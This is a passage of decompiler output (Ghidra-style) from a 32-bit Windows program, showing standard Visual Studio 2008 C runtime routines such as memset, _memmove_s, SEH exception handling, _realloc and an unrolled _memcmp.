    return _Dst;
  }
  uVar1 = _Val & 0xff;
  if ((((char)_Val == '\0') && (0xff < _Size)) && (DAT_00438ea4 != 0)) {
    pauVar2 = __VEC_memzero((undefined (*) [16])_Dst,_Val,_Size);
    return pauVar2;
  }
  puVar5 = (uint *)_Dst;
  if (3 < _Size) {
    uVar3 = -(int)_Dst & 3;
    sVar4 = _Size;
    if (uVar3 != 0) {
      sVar4 = _Size - uVar3;
      do {
        *(char *)puVar5 = (char)_Val;
        puVar5 = (uint *)((int)puVar5 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar4 & 3;
    uVar3 = sVar4 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar5 = (char)uVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



int __cdecl FUN_00416c8a(short *param_1)

{
  short sVar1;
  short *psVar2;
  
  psVar2 = param_1;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  return ((int)psVar2 - (int)param_1 >> 1) + -1;
}



// Library Function - Single Match
//  _memmove_s
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

errno_t __cdecl _memmove_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_MaxCount == 0) {
LAB_00416cfb:
    eVar2 = 0;
  }
  else {
    if ((_Dst == (void *)0x0) || (_Src == (void *)0x0)) {
      piVar1 = __errno();
      eVar2 = 0x16;
      *piVar1 = 0x16;
    }
    else {
      if (_MaxCount <= _DstSize) {
        _memmove(_Dst,_Src,_MaxCount);
        goto LAB_00416cfb;
      }
      piVar1 = __errno();
      eVar2 = 0x22;
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar2;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00432c20 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl __except_handler4(int *param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  BOOL BVar3;
  PVOID pvVar4;
  int *piVar5;
  int *local_1c;
  undefined4 local_18;
  PVOID *local_14;
  undefined4 local_10;
  PVOID local_c;
  char local_5;
  
  piVar5 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_00432c20);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  pvVar4 = param_2;
  if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
    *(int ***)((int)param_2 + -4) = &local_1c;
    pvVar4 = *(PVOID *)((int)param_2 + 0xc);
    local_1c = param_1;
    local_18 = param_3;
    if (pvVar4 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (PVOID *)(piVar5 + (int)pvVar4 * 3 + 4);
      local_c = *local_14;
      if ((undefined *)piVar5[(int)pvVar4 * 3 + 5] != (undefined *)0x0) {
        iVar2 = __EH4_CallFilterFunc_8((undefined *)piVar5[(int)pvVar4 * 3 + 5]);
        local_5 = '\x01';
        if (iVar2 < 0) {
          local_10 = 0;
          goto LAB_00416e08;
        }
        if (0 < iVar2) {
          if ((*param_1 == -0x1f928c9d) &&
             (BVar3 = __IsNonwritableInCurrentImage((PBYTE)&PTR____DestructExceptionObject_0042b580)
             , BVar3 != 0)) {
            ___DestructExceptionObject(param_1);
          }
          __EH4_GlobalUnwind_4(param_2);
          if (*(PVOID *)((int)param_2 + 0xc) != pvVar4) {
            __EH4_LocalUnwind_16((int)param_2,(uint)pvVar4,iVar1,&DAT_00432c20);
          }
          *(PVOID *)((int)param_2 + 0xc) = local_c;
          if (*piVar5 != -2) {
            ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
          }
          ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
          __EH4_TransferToHandler_8((undefined *)local_14[2]);
          goto LAB_00416ecc;
        }
      }
      pvVar4 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_00416ecc:
    if (*(int *)((int)pvVar4 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)pvVar4,0xfffffffe,iVar1,&DAT_00432c20);
  }
LAB_00416e08:
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  return local_10;
}



// Library Function - Single Match
//  _wcsnlen
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _wcsnlen(wchar_t *_Src,size_t _MaxCount)

{
  uint uVar1;
  
  uVar1 = 0;
  if (_MaxCount != 0) {
    do {
      if (*_Src == L'\0') {
        return uVar1;
      }
      uVar1 = uVar1 + 1;
      _Src = _Src + 1;
    } while (uVar1 < _MaxCount);
  }
  return uVar1;
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00432c30)[uVar1 * 2]) {
      return (&DAT_00432c34)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2008 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_00432d98;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2008 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_00432d9c;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Single Match
//  __dosmaperr
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  int iVar2;
  uint *puVar3;
  int *piVar4;
  DWORD DVar5;
  LPVOID pvVar6;
  uint *local_24;
  int *local_20;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
    return (void *)0x0;
  }
  if (DAT_00437d4c == 3) {
    do {
      local_20 = (int *)0x0;
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_0041716f;
      __lock(4);
      local_24 = (uint *)___sbh_find_block((int)_Memory);
      if (local_24 != (uint *)0x0) {
        if (_NewSize <= DAT_00437d58) {
          iVar2 = ___sbh_resize_block(local_24,(int)_Memory,_NewSize);
          if (iVar2 == 0) {
            local_20 = ___sbh_alloc_block((uint *)_NewSize);
            if (local_20 != (int *)0x0) {
              puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
              if (_NewSize <= puVar3) {
                puVar3 = (uint *)_NewSize;
              }
              _memcpy(local_20,_Memory,(size_t)puVar3);
              local_24 = (uint *)___sbh_find_block((int)_Memory);
              ___sbh_free_block(local_24,(int)_Memory);
            }
          }
          else {
            local_20 = (int *)_Memory;
          }
        }
        if (local_20 == (int *)0x0) {
          if ((uint *)_NewSize == (uint *)0x0) {
            _NewSize = 1;
          }
          _NewSize = _NewSize + 0xf & 0xfffffff0;
          local_20 = (int *)HeapAlloc(DAT_00436454,0,_NewSize);
          if (local_20 != (int *)0x0) {
            puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
            if (_NewSize <= puVar3) {
              puVar3 = (uint *)_NewSize;
            }
            _memcpy(local_20,_Memory,(size_t)puVar3);
            ___sbh_free_block(local_24,(int)_Memory);
          }
        }
      }
      FUN_004170da();
      if (local_24 == (uint *)0x0) {
        if ((uint *)_NewSize == (uint *)0x0) {
          _NewSize = 1;
        }
        _NewSize = _NewSize + 0xf & 0xfffffff0;
        local_20 = (int *)HeapReAlloc(DAT_00436454,0,_Memory,_NewSize);
      }
      if (local_20 != (int *)0x0) {
        return local_20;
      }
      if (DAT_00436770 == 0) {
        piVar4 = __errno();
        if (local_24 != (uint *)0x0) {
          *piVar4 = 0xc;
          return (void *)0x0;
        }
        goto LAB_0041719c;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
    if (local_24 != (uint *)0x0) goto LAB_0041717b;
  }
  else {
    do {
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_0041716f;
      if ((uint *)_NewSize == (uint *)0x0) {
        _NewSize = 1;
      }
      pvVar6 = HeapReAlloc(DAT_00436454,0,_Memory,_NewSize);
      if (pvVar6 != (LPVOID)0x0) {
        return pvVar6;
      }
      if (DAT_00436770 == 0) {
        piVar4 = __errno();
LAB_0041719c:
        DVar5 = GetLastError();
        iVar2 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar2;
        return (void *)0x0;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
  }
  DVar5 = GetLastError();
  iVar2 = __get_errno_from_oserr(DVar5);
  *piVar4 = iVar2;
  return (void *)0x0;
LAB_0041716f:
  __callnewh(_NewSize);
  piVar4 = __errno();
LAB_0041717b:
  *piVar4 = 0xc;
  return (void *)0x0;
}



void FUN_004170da(void)

{
  FUN_0041be7c(4);
  return;
}



// Library Function - Single Match
//  _memcmp
// 
// Library: Visual Studio 2008 Release

int __cdecl _memcmp(void *_Buf1,void *_Buf2,size_t _Size)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  
  if (_Size == 0) {
    return 0;
  }
  if (_Size == 1) {
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar2 = (uint)*_Buf2;
  }
  else if (_Size == 2) {
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar2 = (uint)*_Buf2;
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 1);
  }
  else if (_Size == 3) {
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar2 = (uint)*_Buf2;
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 1);
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 2);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 2);
  }
  else {
    if (_Size != 4) {
LAB_00417663:
      switch(_Size) {
      case 0:
        break;
      case 1:
        goto switchD_00417678_caseD_1;
      case 2:
        goto switchD_00417678_caseD_2;
      case 3:
        goto switchD_00417678_caseD_3;
      case 4:
        goto switchD_00417678_caseD_4;
      case 5:
        goto switchD_00417678_caseD_5;
      case 6:
        goto switchD_00417678_caseD_6;
      case 7:
        goto switchD_00417678_caseD_7;
      case 8:
        goto switchD_00417678_caseD_8;
      case 9:
        goto switchD_00417678_caseD_9;
      case 10:
        goto switchD_00417678_caseD_a;
      case 0xb:
        goto switchD_00417678_caseD_b;
      case 0xc:
        goto switchD_00417678_caseD_c;
      case 0xd:
        goto switchD_00417678_caseD_d;
      case 0xe:
        goto switchD_00417678_caseD_e;
      case 0xf:
        goto switchD_00417678_caseD_f;
      case 0x10:
        goto switchD_00417678_caseD_10;
      case 0x11:
        goto switchD_00417678_caseD_11;
      case 0x12:
        goto switchD_00417678_caseD_12;
      case 0x13:
        goto switchD_00417678_caseD_13;
      case 0x14:
        goto switchD_00417678_caseD_14;
      case 0x15:
        goto switchD_00417678_caseD_15;
      case 0x16:
        goto switchD_00417678_caseD_16;
      case 0x17:
        goto switchD_00417678_caseD_17;
      case 0x1a:
        goto switchD_00417678_caseD_1a;
      case 0x1b:
        goto switchD_00417678_caseD_1b;
      case 0x1c:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1c));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1c))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
      case 0x18:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x18));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x18))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_14:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x14));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x14))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_10:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x10));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x10))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_c:
        if (*(int *)((int)_Buf1 + (_Size - 0xc)) == *(int *)((int)_Buf2 + (_Size - 0xc))) {
          iVar3 = 0;
        }
        else {
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 10));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 10));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 9)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 9));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_8:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 8));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 8))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 8));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 7));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 7));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 6));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 6));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 5)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 5));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_4:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 4));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 4))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 4));
          if ((uVar1 == uVar2) ||
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 == 0)) {
            uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 3));
            uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 3));
            if ((uVar2 == uVar1) ||
               (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 == 0)) {
              uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 2));
              uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 2));
              if (((uVar2 == uVar1) ||
                  (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 == 0)
                  ) && (iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 1)) -
                                (uint)*(byte *)((int)_Buf2 + (_Size - 1)), iVar3 != 0)) {
                iVar3 = (uint)(0 < iVar3) * 2 + -1;
              }
            }
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
        break;
      case 0x1d:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1d));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1d))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1d));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
      case 0x19:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x19));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x19))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_15:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x15));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x15))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_00417678_caseD_11:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x11));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x11))) {
          iVar3 = 0;
        }
